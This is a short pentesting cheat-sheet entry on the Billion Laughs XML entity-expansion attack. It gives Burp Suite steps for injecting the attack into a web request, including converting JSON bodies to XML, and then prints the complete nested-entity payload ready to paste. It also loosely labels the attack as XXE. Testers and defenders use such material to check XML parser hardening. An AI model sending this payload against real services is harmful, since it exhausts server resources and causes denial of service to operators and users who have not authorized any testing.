# Billion Laugh Attack
- Another common vulnerability associated with XML parsing is called A Billion Laughs Attack. It uses an entity to resolve itself cyclically thereby consuming more CPU usage and causing a denial of service attack. An Example XML payload that can cause an XXE attack is as follows:

```
Step 1 : Capture the request into Burp
Step 2 : Send it to the repeater tab and then convert the body into XML whether it is accepting or not
Step 3 : To confirm, Check for the [ Accept ] Header change it into Application/json
Step 4 : Covert JSON into XML if their is no Possibility
Step 5 : Add the payload in between and change the content lol1 to lol9 depending on the dos variation in the xml field!
```

- Billion Laugh Payload :
```
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz> 
```

## Contributor:
- [N3T_hunt3r](https://twitter.com/N3T_hunt3r)
